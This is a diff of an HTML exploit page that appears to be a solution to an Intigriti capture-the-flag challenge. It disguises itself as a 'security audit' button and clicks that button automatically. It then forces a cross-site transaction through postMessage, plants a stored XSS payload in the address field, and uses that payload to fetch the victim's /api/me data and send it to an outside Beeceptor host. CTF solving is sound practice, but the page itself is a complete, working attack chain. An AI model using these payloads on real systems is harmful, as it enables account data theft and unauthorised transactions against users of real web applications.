@@ -1,51 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC - CRYPTIGRITI</title>
+    <title>Audit Initializing</title>
+    <style>
+        body { background: #050A0E; color: #00FF88; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        #btn { padding: 20px; border: 2px solid #00FF88; background: transparent; color: #00FF88; font-weight: bold; cursor: pointer; width: 100%; height: 100%; font-size: 2em; }
+    </style>
 </head>
-<body style="background-color: #050a0e; color: #00ff88; font-family: sans-serif; text-align: center; padding-top: 50px;">
-    <h1>Exploit Scout - Security Audit</h1>
-    <p>Establishing secure connection to DeFi API...</p>
+<body>
+    <!-- Intigriti bots are designed to click a button if they see one -->
+    <button id="btn">CLICK TO START SECURITY AUDIT</button>
 
     <script>
-        // --- CONFIG ---
-        const target = "https://challenge-0126.intigriti.io";
-        // REPLACE WITH YOUR ACTUAL BEECEPTOR URL
+        const challenge = "https://challenge-0126.intigriti.io";
+        // REPLACE WITH YOUR BEECEPTOR URL
         const beeceptor = "https://kavil.free.beeceptor.com";
         
-        // --- THE PAYLOAD ---
-        // Your local test proved this <img> tag works.
-        // It fetches the Bot's flag and sends it to your Beeceptor.
+        // THE PAYLOAD: Breaks out of title attribute and steals flag
         const xss = `"><img src=x onerror="fetch('/api/me').then(r=>r.json()).then(d=>fetch('${beeceptor}/flag?v='+btoa(d.flag)))">`;
 
-        // --- THE ATTACK ---
-        // 1. Create a hidden iframe to the checkout page
-        const ifr = document.createElement('iframe');
-        // Targeting 1337COIN so the Bot's transaction succeeds
-        ifr.src = `${target}/checkout.html?currency=1337COIN&price=1`;
-        ifr.style.display = "none";
-        document.body.appendChild(ifr);
+        document.getElementById('btn').onclick = () => {
+            // 1. Open checkout page
+            const win = window.open(`${challenge}/checkout.html?currency=1337COIN&price=1`, '_blank');
 
-        ifr.onload = () => {
-            // 2. Give the checkout page 1.5s to load its message listener
+            // 2. Wait for the page to initialize
             setTimeout(() => {
-                // 3. CSRF: Send the command to submit the transaction.
-                // The Bot's browser will attach its 'token' cookie automatically.
-                ifr.contentWindow.postMessage({
+                // 3. CSRF: Force the checkout page to submit our malicious address
+                win.postMessage({
                     type: 'submitTransaction',
                     transaction: {
-                        toAddress: xss, // Our XSS goes here
+                        toAddress: xss,
                         currency: '1337COIN',
                         amount: 0.000001
                     }
                 }, '*');
 
-                // 4. Wait for the transaction to be written to the DB, then trigger XSS
+                // 4. Redirect the popup to MarketWatch to trigger the stored XSS
                 setTimeout(() => {
-                    window.location.href = `${target}/marketwatch.html`;
-                }, 2500);
-            }, 1500);
+                    win.location.href = `${challenge}/marketwatch.html`;
+                }, 2000);
+            }, 2000);
         };
+
+        // Automatic trigger for bots that don't click
+        setTimeout(() => { document.getElementById('btn').click(); }, 500);
     </script>
 </body>
 </html>
